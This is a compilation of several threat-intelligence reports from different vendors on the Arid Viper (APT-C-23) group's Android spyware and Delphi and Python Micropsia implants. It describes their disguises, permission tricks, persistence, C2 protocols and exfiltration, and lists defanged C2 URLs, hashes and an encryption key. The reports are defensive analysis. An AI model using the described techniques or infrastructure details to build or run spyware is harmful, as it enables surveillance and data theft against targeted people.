Cyble is a global threat intelligence SaaS provider that helps enterprises protect themselves from cybercrimes and exposure in the Darkweb. Its prime focus is to provide organizations with real-time visibility to their digital risk footprint. Backed by Y Combinator as part of the 2021 winter cohort, Cyble has also been recognized by Forbes as one of the top 20 Best Cybersecurity Start-ups To Watch In 2020. Headquartered in Alpharetta, Georgia, and with offices in Australia, Singapore, and India, Cyble has a global presence. To learn more about Cyble, visit www.cyble.com .
Share this:
Like this: Like Loading...Newly-discovered variants of an Android spyware that previously was attributed to an advanced persistent threat actor group called C-23 (also known as GnatSpy, FrozenCell, or VAMP) have incorporated new features into their malicious apps that make them more resilient to actions by users, who might try to remove them manually, and to security and web hosting companies that attempt to block access to, or shut down, their command-and-control server domains.
The C-23 threat actor has, in the past, targeted individuals based in the Middle East, particularly in the Palestinian Territories. The group has been active since at least 2017.
The spyware app initially disguises itself as something called “App Updates”
The new variants appear in the form of an app that purports to install updates on the target’s phone, with names that include App Updates, System Apps Updates, or Android Update Intelligence . Sophos suspects that the apps are delivered to specific users by means of SMS text messages linking to downloads. To the best of our knowledge, none of the apps have been hosted on Google Play Store, though Sophos did reach out to the Android security team and sent details about the apps to the company.
Once installed, the spyware sends unique, identifiable device parameters to its command-and-control server. One of the newer features of this variant is that it will, initially, use a hardcoded C2 address to communicate, but also contains code that allows the operators of the spyware to push down a new address. This ability can keep the malware functional if one or more of the C2 server domains is taken down. The new variants did not conceal or obfuscate the C2 server address in any way.
Code that can modify the C2 domain on a running installation is a notable new feature
Many of the new variants were found to have been digitally signed by a certificate (with serial number ece521e38c5e9cbea53503eaef1a6ddd204583fa) that Sophos has associated with malware for years.
Changing disguises after installation
The first time the user opens the app, it requests that the user grant the app specific permissions to do the kinds of things you’d expect spyware to do: It requests permissions to record ambient audio, and to access all files stored on the device. But the apps also use a bit of social engineering to ask the user to grant advanced permissions: notification access, device administrator, and the ability to observe the user’s actions while interacting with apps.
The app’s requests appear to justify the need for the additional features, but they’re lies. For instance, the request to “Enable Notifications” claims that the app needs this functionality or else “you won’t receive notifications in real time.”
But that isn’t what Notification Access permissions do. When prompted to enable this feature, the app pushes the user to a system permissions window that accurately describes what the permission does. The threat actors may assume that the target won’t carefully read, or understand, the consequences of clicking Allow on this screen.
This permission grants the spyware the ability to read the full-text messages and the names of contacts, from any app, such as Facebook or WhatsApp, as well as dismissing notifications from other apps (such as a mobile anti-malware app’s warnings) or toggling the Do Not Disturb settings on the phone. The device administrator permission gives the operator of the app the ability to lock the phone, but according to our analysis, the spyware’s current version has no capability to do this.
The app prompts the user to Enable the device admin permission or “system won’t secure your internet connection.”
In reality, the feature the spyware wants the user to enable would let the spyware lock the phone.
The final prompt asks the user to change a setting with a vague warning about something being blocked as a result of battery optimization. Like the other prompts, this is also bogus. This prompt redirects the user to enable a feature that permits the spyware to identify what apps you use, when you’re using them. The spyware sends that information onward to its C2 server.
Once the target has granted all these permissions, the app disguises itself to evade any attempts at manual removal by the user. The method to attain stealth appears to be new to this version: the spyware changes its icon (and name) to disguise itself using an icon of one of the four apps: Google Play, Youtube, Google, or Botim (a VOIP calling app).
Once this happens, the next time the spyware app is opened, the spyware opens the real app whose disguise it wears, i.e., it opens Chrome if it disguises itself as Chrome, thereby giving an illusion to the user that the app is legit.
The spyware app icon appears as “App Updates” before the change…
…and afterward takes on the icon of the Chrome browser, and launches that app when the user clicks the icon.
The apps contain a text string, in the Arabic language, that they send to the command and control server when the icon has been changed. These strings are present in these new versions of the malware.
تم تغيير الأيقونة
We also found that it tried to install its own version of Botim from the application’s assets – a functionality we believe was meant for future versions, as the samples did not contain (or try to download) any Botim APK file.
Each functionality of the spyware has a command associated with it. The commands are received via Firebase messaging, and the spyware performs the corresponding function as and when instructed.
The live C2 servers posed as websites for Laravel – a web application framework.
C2 website posed as website for Laravel (a web application framework)
Yet many of the functionalities of the spyware remain unchanged. The app does the following things:
Collects SMS, contacts, call logs
Collects images and documents
Recording audio, incoming and outgoing calls, including WhatsApp calls
Taking screenshots and recording video of the screen
Taking pictures using the camera
Hiding its own icon
Reading notifications from WhatsApp, Facebook, Facebook Messenger, Telegram, Skype, IMO Messenger, or Signal
Canceling notifications from built-in security apps (such as Samsung SecurityLogAgent, Xiaomi MIUI SecurityCenter, Huawei SystemManager), as well as from Android system apps, package Installer, and its own notifications
Internal logging shows the app writing out the contents of the contact list, call logs, and SMS messages to a Zip archive it later uploads to its C2
Don’t be a spyware victim
To avoid falling prey to such malicious apps, users should only install apps from trusted sources such as Google Play. Updating Android OS and applications should be done via Android Settings and Google Play respectively, instead of relying on a third-party app.
Users should be particularly wary of apps asking for sensitive permissions such as device admin, notification access, or those requiring superuser/root access. Users can view the apps currently having device admin and notification access permissions by browsing to Settings and searching for “Device admin apps” and “Notification access” respectively.
Detections and acknowledgments双尾蝎（奇安信内部跟踪编号：APT-Q-63）是一个长期针对中东地区的高级威胁组织，其最早于2017年被披露。至少自2016年5月起，持续针对巴勒斯坦教育机构、军事机构等重要领域进行网络间谍活动，以窃取敏感信息为主，开展有组织，有计划，有针对性的攻击。 近日，奇安信威胁情报中心红雨滴团队在日常的威胁狩猎中捕获了该组织以巴勒斯坦地区选举话题为诱饵的攻击样本，本次攻击活动的特点如下：
此次攻击样本使用Delphi语言编写，并以WORD文档图标伪装自身；
此次攻击活动针对巴勒斯坦地区，以该地区热点事件为诱饵进行攻击；
经研究人员分析发现，该组织已将此类样本工具化，只需修改简单配置即可发起批量攻击；
相关攻击未发现影响国内，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括威胁情报平台（TIP）、天眼高级威胁检测系统、NGSOC、奇安信态势感知等，都已经支持对此APT攻击团伙攻击活动的精准检测。
本次捕获的样本为RAR压缩的文件，其文件名翻译后为“大学的报告.docx.xz”。 解压后里面包含一个伪装为Word图标的EXE，且具有较长的文件名，如在不显示文件后缀的电脑环境中，该伪装具有很强的迷惑性，该EXE基本信息如下：
تقريرجامعي docx.xz
bd9a5149f1f89f4b05902aa416687d80
university report 34783693 473897346 8734676 docx.exe
414a076ad5eeeac5352d792dc2889cf2
Win32 EXE
样本执行后将从资源获取诱饵文档释放展示，诱饵文档内容主要是关于针对巴勒斯坦选举活动举行的地点商议，其中涉及到各方势力及强宗教信息。属于中东地区双尾蝎、Molerats等组织在攻击活动中的常用话题。
该样本与我们在9月《疑似双尾蝎APT组织近期针对巴勒斯坦地区的攻击活动分析》 [1] 一文中披露的windows平台样本相似，均为Delphi 语言编写，且携带一个隐藏的窗体，均从资源中释放诱饵文档。
通过对比9月捕获的样本，可以看到双尾蝎组织对代码进行部分修改，将某些功能函数封装在了点击组件中，其中4个定时器依旧没有改变，将以往网络相关的封装在了pstReq函数中。
与9月我们披露的样本一样，样本1中的Timer1会引导其他控件执行任务，Time1执行后首先会从资源中获取诱饵文档数据保存到%tmp%目录下，然后将其打开以迷惑受害者。
通过对以往样本进行对比，Timer3的功能没有做出什么改变，相似度为0.99（1为完全相似），依旧是在%tmp%目录下创建一个指向自身的lnk文件，随后移植到启动目录用于持久化。
而定时器Timer4的相似度为0.75，通过分析，依旧保留收集计算机名字，用户名，系统版本等信息，区别为新增在Roaming目录下释放dsfjj45k.tmp文件，文件内容为8位随机字符，8位随机字符后续与计算机名用户名进行拼接，疑似用作标识受害者。
奇安信威胁情报中心对此次捕获样本攻击手法，代码逻辑层面分析，发现此次捕获的攻击样本与双尾蝎APT组织常用攻击手法，恶意代码基本一致。 其中Delphi 语言编写的样本较以往样本无较大变化。通过对样本里面硬编码的诱饵文件名进行推测，双尾蝎APT组织已经将Delphi 语言编写的该类样本工具化，仅需进行简单配置便可进行利用。
双尾蝎组织是常年活跃在中东地区APT团伙，其具有Windows和Android双平台攻击武器，且仅Windows平台恶意代码就丰富多变，具有多种语言编译的后门。对此次样本的分析可知，该组织的攻击手法一直以来没有较大的改变，此次利用巴勒斯坦选举的热点新闻事件进行情报刺探更是说明该组织善于运用社会工程学进行攻击，且持续活跃在中东地区。 此次捕获的样本主要针对中东地区开展攻击活动，暂未发现影响国内用。奇安信红雨滴团队提醒广大用户，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。 若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别。目前已支持包括Windows、安卓平台在内的多种格式文件深度分析。 目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。
bd9a5149f1f89f4b05902aa416687d80 414a076ad5eeeac5352d792dc2889cf2
URL hxxps://bruce-ess.com//qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/fz5efubfKO3n3Y5
[1] https://ti.qianxin.com/blog/articles/APT-Q-63-Recent-Attacks-Targeting-Palestinian-Areas/
奇安信威胁情报中心 威胁情报信息共享，事件预警通报，攻击事件分析报告，恶意软件分析报告 408篇原创内容 公众号双尾蝎（奇安信内部跟踪编号：APT-Q-63）是一个长期针对中东地区的高级持续威胁组织，其最早于2017年被披露。该组织至少自2016年5月起，持续针对巴勒斯坦教育机构、军事机构等重要领域进行网络间谍活动，以窃取敏感信息为主的网络攻击组织，开展了有组织，有计划，有针对性的攻击。其攻击行业包括基础设施，国防、教育、政府、媒体、交通等。攻击的国家包括但不限于美国，韩国，巴勒斯坦，日本，瑞典、以色列等 [1] 。
双尾蝎组织具有Windows和Android双平台攻击武器，且仅Windows平台恶意代码就丰富多变，具有多种语言编译的后门。近日，奇安信威胁情报中心红雨滴团队在日常的威胁狩猎中捕获了该组织以Python构建的攻击样本，该类样本最早由国外厂商发现并命名为PyMICROPSIA [2] 。通过对攻击样本的分析，发现本次攻击活动的特点如下：
样本使用python版本从以往的3.4升级到3.6。
样本大小较以往缩小了接近一半。
相比以往攻击，样本主体功能没有较大变动。
延续使用人名作为C2、远控指令、部分变量名的传统。
PyMICROPSIA将各功能模块进行拆分，这样在攻击样本被曝光后能及时更新以达到免杀的效果，这样做的好处不仅开发周期短，利用也较为简单，以至于被首次上传VirusTotal时，查杀的厂商仅为个位数。
双尾蝎一直以来喜欢用演员或者编剧的名字来给变量进行命名，PyMICROPSIA也不例外，其对C2以及一些变量的命名，依旧延续了其使用人名的传统。
而在流程方面，与以往不同的是，本次捕获的PyMICROPSIA首先连接google.com对网络联通性进行判断，只有在返回200的状态码后才会进行后续操作，否则一直循环连接，这样做可以对一些沙箱进行规避操作，进而导致沙箱误判。
PyMICROPSIA使用了大量的Python内置库和网上开源的库来完成其远控功能，例如使用网上开源的mss库来完成截图功能。
和以往样本不同的是，新版本的PyMICROPSIA使用了AES算法来对所获取的文件进行加密，加密密钥为‘5750513252304445534b544f502d504950424c’。
值得一提的是，在对窃取来的视频文件、文档文件、音频等文件加密时，使用受害者电脑名和用户名以及随机生成的10位字符与上面密钥的一部分拼接为压缩密码，该行为疑似在标记受害终端信息。
新版本还删除了Outlook文件窃取模块，管道后门模块。
以及窃取Chrome密码的模块。
PyMICROPSIA 实现了一个基于HTTP的C2协议，在通信期间根据调用的功能使用不同的统一资源标识符 (URL) 路径和变量来实现不同的功能，其父路径为 ‘/HCWQL6Bmd24UKcIJwnuT/sWwnooT8ooo2Zr9k0Sk6/’，各路径功能如下：
0x04 PayLoad
根据上面所列的请求路径，可以清晰的看到会下载三个文件回来执行，其中第一个文件为rar.exe，用来给收集的文件进行压缩。第二个文件QuickActionsDataModel.exe因为没托管在C2上了，导致下载失败。
下载的第三个文件SecureAssessmentManagerNetwork.exe，使用了看起来像系统文件一样的命名方式，需要传递有效参数才能成功执行，否则会弹出错误框。这样做的好处是，会妨碍沙箱以及安全研究员的分析。
该程序删除了键盘记录器的功能，仅保留了创建LNK文件实现持久化的功能。
但令人不解的是，PyMICROPSIA并未修改相关配置，攻击程序名为ProperDataecutionPreve.exe却创建ModelsControllerLib.lnk文件。
溯源与关联
在对PyMICROPSIA进行分析时，我们发现一个有趣的细节，在PyMICROPSIA中一直有一句阿拉伯文的字符串，并且新旧版本中一直没有改变，考虑到假旗行动的可能性，这可能反应了攻击者或者被攻击者的文化背景。
通过奇安信威胁情报平台（TIP）对此次涉及的域名进行查询，可以看到解析的IP为79.133.41.250。
在对IP进行溯源分析时，我们发现了两个与之通信的样本，其中一个样本我们在上个月《双尾蝎APT组织以巴勒斯坦选举热点信息为诱饵的攻击活动分析》 [3] 一文中进行了披露。
另一个样本与双尾蝎APT组织常用攻击手法，恶意代码基本一致，也是使用Delphi语言编写，通过下图我们可以清晰的看到其与PyMICROPSIA 样本中观察到的 URI 路径结构十分相似，其样本恶意功能也与我们之前披露的一致。
通过对样本恶意功能、URL路径结构、以及C2的关联性来看，我们有理由相信PyMICROPSIA是双尾蝎组织的新型信息窃取木马。
对PyMICROPSIA的分析可知，双尾蝎组织一直尝试拓展新的攻击方法，其武器库错综复杂，此次捕获的样本使用python编写，其免杀效果较好，值得引起警惕。
奇安信红雨滴团队在此提醒广大用户，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。
若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（ https://sandbox.ti.qianxin.com/sandbox/page ）进行判别。目前已支持包括Windows、安卓平台在内的多种格式文件深度分析。
目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。
d96968934691fa9b1547eb98aaced472
30cb8229264315ffc07ac2796c9fbc9d
36e291abe37fff7868c5ca7d4105c86b
https://wayne-lashley[.]com
http://wayne-lashley[.]com
http://jane-chapman[.]com
79.133.41.250
[1] https://ti.qianxin.com/apt/detail/5b2376bf596a1000192dbcd2?name=%E5%8F%8C%E5%B0%BE%E8%9D%8E&type=map
[2] https://unit42.paloaltonetworks.com/pymicropsia/
[3] https://ti.qianxin.com/blog/articles/APT-Q-63-Attack-Targeting-Palestinian-Areas-Using-Election-Information-as-Bait/
附表一 完整远控指令功能表近期暗影移动安全实验室捕获了一款APT-C-23样本。APT-C-23 又被称为“双尾蝎”，在2017年首次被发现，这个组织针对巴勒斯坦等国家和地区。在此次捕获的样本中，我们发现此恶意软件名为“Google Play Installer”恶意程序，安装后伪装成Telegram应用程序类似的图标和界面。
该恶意软件在多个维度获取用户的各种隐私信息，在获取用户隐私信息中含有获取用户的联系人信息、短信、通话记录、图片、文档、以及音频文件。该恶意软件获取如此之多的用户信息可谓是全覆盖。
2.样本信息
样本md5：DD4596CF68C85EB135F7E0AD763E5DAB
包名：org.Telegram.light
应用名称：Google Play Installer
3.程序运行流程
该恶意应用在图标方面仿冒Telegram应用，诱导用户安装。安装完毕后在UI界面仿冒Telegram应用，诱导用户使用，在用户启动之后，在用户未知的情况下窃取用户各类隐私信息。
图 1 简略流程图
4.获取权限窃取用户隐私
4.1仿冒应用获取权限
4.1.1仿冒正规应用
该恶意应用从安装图标仿冒Telegram应用，诱导用户安装，从UI界面仿冒Telegram应用，骗取用户信任。
图2 仿冒正规应用
4.1.2获取用户权限
在用户使用过程中利用Google Play诱导获取用户通知等权限，获取通知权限后，用户获取短信等行为时，该恶意软件可以直接读取用户短信等，为窃取用户隐私信息提供便利。
图3 获取用户通知权限
4.2隐私窃取
该恶意程序私自获取用户隐私信息中含有获取用户的联系人信息、短信、通话记录、图片、文档、以及音频文件，并将获取到的用户信息上传到指定服务器。
4.2.1 窃取用户联系人信息
获取用户的联系人信息，其中包含用户的联系人的姓名、电话号码等信息。
图 4窃取用户联系人信息
4.2.2 窃取用户短信
获取用户短信的电话号码、短信内容。
图 5窃取用户短信
4.2.3 窃取用户通话记录信息
获取用户的通话记录，包括电话号码、时间信息。
图 6窃取用户通话记录信息
4.2.4 窃取用户图片信息
获取用户的图片信息，根据图片名称进行重命名，格式化成后缀.cam结尾的文件格式。
图7 窃取用户图片信息
4.2.5窃取用户指定类型文件
窃取用户的指定文件，包含pdf文件、doc文件、docx文件、ppt文件、pptx文件、xls文件、xlsx文件、txt文件、text文件等。
图8 窃取用户指定文件
4.2.6窃取用户音频信息
根据用户的音频信息，将音频信息进行格式话，形成以.np3结尾的文件格式。
图9 窃取用户音频信息
4.2.7上传窃取用户隐私信息
将获取用户的隐私信息上传到指定服务器。将窃取的用户隐私上传到不同的url当中。
https://S***T-C***N.COM/version/sms_received_full/
https://S***T-C***N.COM/version/sms_received_full/call_logs
图10上传用户信息
4.3加密服务器地址
该恶意软件从so当中获取加密字符，对加密字符进行解密，解密后得到中间地址，并保存在SharedPreferences文件当中，对中间地址进行解密还原，得到服务器地址https://S***T-C***N.***/。
从so文件当中获取加密字符
图11获取加密字符串
调用解密方法，得到中间地址https://s***s.g***e.com/view/janx/about
服务器地址存放到本地SharedPreferences文件当中。
图12调用解密方法解密加密字符串
图13保存中间地址到本地
根据中间地址：https://s***s.g***e.com/view/janx/about进行解密，得到服务器地址：https://S***T-C***N.COM/
图14解密中间地址
APT攻击是高级可持续威胁攻击,也称为定向威胁攻击，指某组织对特定对象展开的持续有效的攻击活动。该样本就是一个APT攻击样本，名为谷歌安装器，安装后又仿冒成Telegram应用程序类似的图标和界面，主要目的持续性的窃取用户的各种隐私信息，又通过远程服务器控制用户设备，执行远程控制指令，给用户设备安全造成严重的威胁。
恒安嘉新暗影移动安全实验室在此提醒广大用户，不轻易相信陌生人，不轻易点击陌生人发送的链接，不轻易下载不安全应用，不安装非正规途径来源的APP。
-安全从自身做起，建议用户在下载软件时，到正规的应用商店进行下载正版软件，避免从论坛等下载软件，可以有效的减少该类病毒的侵害；
-很多用户受骗正是因为钓鱼短信的发件人显示为10086、95588等正常号码而放松安全警惕导致中招，运营商需要加强对伪基站的监控打击力度，减少遭受伪基站干扰的几率；
-各大银行、各支付平台需要加强对各自支付转账渠道的监管，完善对用户资金转移等敏感操作的风控机制，防止被不法分子利用窃取用户网银财产;
-警惕各种借贷软件的套路，不要轻易使用借贷类App。
暗影移动安全实验室（EversecLab）是恒安嘉新移动安全能力的支撑部门，由移动安全、数据安全、人工智能、漏洞挖掘等众多领域专家组成，专注于移动安全技术创新与研究，以及移动互联网应用安全的生态建设，包括移动恶意程序分析、安全风险评估、信息安全检测、数据安全评估、黑灰产溯源挖掘、诈骗APP分析、隐私合规检测等等。自主研发第四代移动APP高速研判分析引擎，支持动态检测引擎（动态沙箱技术）、静态检测引擎、AI检测引擎，样本库积累千万级，PB级大数据存储处理技术等。可为客户提供海量应用的信息挖掘，精准、实时、高效的APP检测、情报数据收集、数据关联分析、情报线索扩展，大屏态势感知展示等等。 “安全创造价值”–暗影移动安全实验室坚持以安全为核心，研究为己任，继续创新和开发解决用户问题和行业痛点的产品，为国家的网络安全事业保驾护航。2022-01-13
近日，瑞星威胁情报中心捕获到一起针对中东地区阿拉伯语国家的攻击事件，通过分析发现，此次攻击事件的主谋是APT-C-23组织。该组织通过互联网盈利为噱头，诱骗目标打开伪装成docx文档的远程控制病毒，从而进行信息收集、远程服务器通信、窃取机密等行为。
近日，瑞星威胁情报中心捕获到一起针对中东地区阿拉伯语国家的攻击事件，通过分析发现，此次攻击事件的主谋是APT-C-23组织。该组织通过互联网盈利为噱头，诱骗目标打开伪装成docx文档的远程控制病毒，从而进行信息收集、远程服务器通信、窃取机密等行为。目前，瑞星ESM防病毒终端安全防护系统可拦截并查杀此次攻击携带的相关病毒，广大用户可安装使用，杜绝相应风险。
图：瑞星ESM防病毒终端安全防护系统查杀相关病毒
据悉，APT-C-23组织是一个至少从2016年开始对目标进行网络攻击的威胁组织。该组织又被称为FrozenCell、AridViper、Micropsia、Desert Falcon和“双尾蝎”，其主要目的是信息盗窃和间谍活动，具备针对Windows与Android双平台的攻击能力。该组织长期针对中东地区，特别是巴勒斯坦进行攻击，涉及行业多为政府、教育、军事等重要领域。
瑞星安全专家介绍，通过此次攻击中的恶意样本和APT-C-23组织过去的攻击手法可以看出，该组织是利用了社交媒体或自建的钓鱼网站对目标进行攻击的。此次样本所释放的诱饵文档名为“Profit from the Internet.docx”，文档内文显示为阿拉伯文，因此可判定攻击目标为阿拉伯语国家。该文档内容主要是关于“如何通过互联网盈利”，以此来诱骗目标用户点击运行，一旦诱饵文档被打开，恶意程序便会在后台开展信息收集、远程服务器通信等恶意行为，从而达到窃取机密信息的目的。
图：诱饵文档内容及译文
通过分析可以看出，该恶意程序特意使用docx文档图标以达到伪装目的，通过释放白名单诱饵文档和创建快捷方式实现隐蔽性及持久性，当攻击者通过远控病毒获取到目标系统资料后，还会将收集到的信息经过加密处理后上传远程服务器，躲避流量监控，最终达到窃取机密信息的目的。
图：攻击流程
由于这类攻击诱惑性及隐蔽性极强，普通用户极易中招，因此瑞星在此提供广大用户应加强防范，做到以下几点防御措施，避免受到此类攻击。
1.不打开可疑文件。
不打开未知来源的可疑的文件和邮件，防止社会工程学和钓鱼攻击。
2.部署网络安全态势感知、预警系统等网关安全产品。
网关安全产品可利用威胁情报追溯威胁行为轨迹，帮助用户进行威胁行为分析、定位威胁源和目的，追溯攻击的手段和路径，从源头解决网络威胁，最大范围内发现被攻击的节点，帮助企业更快响应和处理。
3.安装有效的杀毒软件，拦截查杀恶意文档和木马病毒。
杀毒软件可拦截恶意文档和木马病毒，如果用户不小心下载了恶意文件，杀毒软件可拦截查杀，阻止病毒运行，保护用户的终端安全。Cisco Talos has observed a new wave of Delphi malware called Micropsia developed and operated by the Arid Viper APT group since 2017.
This campaign targets Palestinian entities and activists using politically themed lures.
The latest iteration of the implant contains multiple RAT and information gathering capabilities.
Cisco Talos has identified a new wave of what is believed to be an ongoing campaign using the Delphi malware since 2017 . Talos believes with high confidence that this is the work of the Arid Viper threat actor. This is a group believed to be based out of Gaza that's known to target organizations all over the world. The actor uses the Micropsia implant in the most recent wave that started around October 2021.
This actor uses their Delphi-based Micropsia implant to target Palestinian individuals and organizations, using politically themed file names and decoy documents. The most recent wave uses content originally published on the Turkish state-run news agency Anadolu and on the Palestinian MA'AN development center to target activists and Palestinian institutions. The tactics, techniques and procedures (TTPs) used in the most recent samples found by Talos lead us to believe this is a campaign linked to the previous campaign we reported on in 2017. Meta exposed this actor in an April 2021 report that focused mainly on mobile targeting operations. However, that did not stop the group, as they've continued to target Windows-based systems. Although this group hasn't technologically evolved, it has the motivation and means to operate longstanding campaigns against the same targets. This level of motivation makes them particularly dangerous to organizations that may come into their crosshairs. An in-depth defense using protections against the several layers of their infection chain is the best strategy to defend against this kind of threat. This should include email security to detect and prevent their most common initial attack vector, along with Cisco Secure Endpoint if the implant is successfully delivered using novel attack vectors. On the network side, Cisco Secure Firewall and Umbrella can be used to detect command and control (C2) communications performed with new versions and variants of their implants.
Arid Viper , also known as Desert Falcon or APT C-23, was first exposed in 2015 . This threat actor's main motivation is espionage and information theft, and has been attributed to malicious operators politically motivated towards the liberation of Palestine. Its victimology is dispersed all over the world, including Palestinian organizations and individuals. Arid Viper is not a technically evolved actor, however, it is known to target mobile and desktop platforms, including Apple iOS. Their toolkit consists of Delphi packers and compilers around their staple malware, Micropsia. This implant has also been ported to other platforms with versions based on Python and an Android version.
Talos has identified new waves of this campaign against Palestinian individuals and organizations. It uses the same TTPs that we published in our first report on this actor back in 2017. The image below shows an example of a lure used in 2019 — while the file name refers to an annual report from 2018, the contents actually mention 2014 and 2015.
The table below shows a small chronology of malicious implants masquerading as documents of interest being created with the same themes, which we associate with high confidence to the same ongoing campaign.
The use of politically themed lures reduced during 2018 and 2019, but we observed a definite increase in their usage in 2020 and 2021. Talos also observed other themes being used by this group (to deliver Micropsia) during 2018 and 2019 and into 2020/21, but they were not considered as part of this campaign in analysis and are beyond the scope of this research.
The politically motivated content in the decoy documents, along with the use of the Arabic language, point to the victims being Palestinian individuals and organizations.
The most recent decoy document from September 2021 contains an article about the reunification of Palestinian families, originally published by the Anadolu Agency on Sept. 3, 2021.
Another decoy, also from September 2021, consists of an article on social and economically sustainable development in Palestine by the MA'AN development center — a Palestinian development and training institution aimed at community development.
Another decoy from July 2021 consisted of a patient's report containing affidavits from the State of Palestine's Ministry of Health. During March and February 2021, we observed the use of politically themed decoys. One of these decoys consisted of a list of questions from a Palestinian activist on the Presidential decree issued on Feb. 20, 2021, ordering the respect of freedom of expression ahead of legislative elections in May.
During this investigation, Talos could not find any email or social media posts that were somehow linked to the Micropsia implants. However, we found the implants and compressed files containing the implants. This follows the same pattern that we described in our 2017 post about this actor. It is highly likely that the threat actor has continued to use the email vector to deliver their lures and implants.
The implant used to target Palestinian entities consists of Delphi-based versions of Micropsia. This implant consists of a Delphi form with four buttons and four timers implemented to carry out different malicious activities described below.
All the malicious functionalities are implemented through the timers configured in the implant.
One of these timers is responsible for extracting the decoy document and saving it to the %TEMP% folder and then displaying it via ShellExecute:
Now, if the implant is started with the " -start " command-line switch, it will skip the process for dropping and displaying the decoy document and jump straight to its RAT functionalities.
Here, the implant will establish persistence by obtaining its current command line, which is then used to create a shortcut for itself in the %TEMP% directory. The shortcut to run the implant contains the "-start" switch (used to skip the displaying of the decoy document). This shortcut is then moved over to the currently logged-in user's Startup folder to complete persistence across reboots and re-logins.
The remaining two timers will gather preliminary system information and activate the RAT capabilities of the implant.
The sequence of actions followed for gathering system information from the endpoint are as follows:
Generate a pc ID for the infected endpoint. Save this value into a data file, such as: " %APPDATA%\dsfjj45k.tmp "
Gather the Computername and username from ENV. Concatenate the computername, username and pcid into format: <COMPNAME>_<username>_<pcid>
Gather installed AV information from the endpoint via " winmgmts:\\localhost\root\SecurityCenter2 " using query " SELECT * FROM AntiVirusProduct ". From the AV information obtained, record the DisplayName.
All this data gathered from the system is individually base64-encoded and assigned to HTTP form query variables with the following name-value pairs:
vcqmxylcv= base64 encoded <COMPNAME>_<username>_<pcid>
vcnwaapcv= base64 encoded AV Name list.
vcllgracv= base64 encoded OS version string.
vcwjlxycv= base64 encoded implant command line.
vccodwfcv= base64 encoded hardcoded flag.
The data is then sent to the implant's C2 server via an HTTP POST request, which is fairly standard in Micropsia implants.
Once the preliminary information has been sent, the implant now begins its remote access trojan (RAT) activity and waits for command codes from the C2 server.
The implant now uses two additional HTTP form variables to transmit the output of the commands executed on the endpoint:
The C2 issues distinct command codes to the implant to carry out various actions on the infected endpoint.
The commands follow the format: ;<cmd_code>;<base64_encoded_supporting_data>;
We have observed implants using two distinct URLs to instrument communications with the C2, one for exfiltration of screenshots and the other for all the other RAT commands.
hxxp[s]://deangelomcnay[.]news/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/ZCgbo9EVhYMA8PX
hxxp[s]://deangelomcnay[.]news/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/bu5EmpJE7DUfzZD
Since its initial disclosure by Talos in 2017, this campaign from Arid Viper has become a long-standing offensive cyber attack spanning well into 2021.
State-sponsored actors and privateer groups rely heavily on stealth in their operations. The public disclosures of campaigns and targeted attacks are usually followed by the actors taking down their infrastructure and revamping their implants to avoid discovery of their malicious assets.
However, in the case of Arid Viper, the continued use of the same TTPs over the past four years indicates that the group doesn't feel affected by the public exposure of its campaigns and implants, and continues to operate business as usual. This complete lack of deterrence makes them a dangerous group once they decide to target an organization or individual.
The lack of change also points to a certain level of success with their current TTPs. The new campaign and accompanying versions of Arid Viper's Micropsia implant disclosed in this research by Talos brings the spotlight back to their politically themed campaign to remind potential victims that the group is still very active.
Arid Viper is a prime example of groups that aren't very advanced technologically, however, with specific motivations, are becoming more dangerous as they evolve over time and test their tools and procedures on their targets. Implants such as Micropsia come in various forms such as Delphi, Python and Android. Such RATs proliferated and operated by a highly motivated threat actor who refuses to back down, consist of a variety of functionalities and are constantly evolving. These RATs can be used to establish long-term access into victim environments and additionally deploy more malware purposed for espionage and stealing information and credentials.
In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises , but also reviewed and improved every time it is put to the test on real-world engagements.
Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.
Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.
Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here .
Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual , Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.
Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.
Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
Umbrella , Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here .
Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.
Additional protections with context to your specific environment and threat data are available from the Firewall Management Center .
Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.
Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org .
d4e56e3a9dec89cc32df78aa4ba8b079aa5e697ed99a1e21e9bd31e85d5d1370
1d4e54529feef53850f97f39029a906d53f3d4b2aea8373e27c413324a55681c
bc03948ce4d88f32017d4a1725a05341d3ff72a616645d9893b8f5d11068217f
8a730266c62fa79435497b1d7db38011e63b6c53b48593d65c24c36044d92dba
f2f36a72cfb25cef74ff0ea8e3ad1c49c6dc3e128fd60a2717f4c5a225e20df2
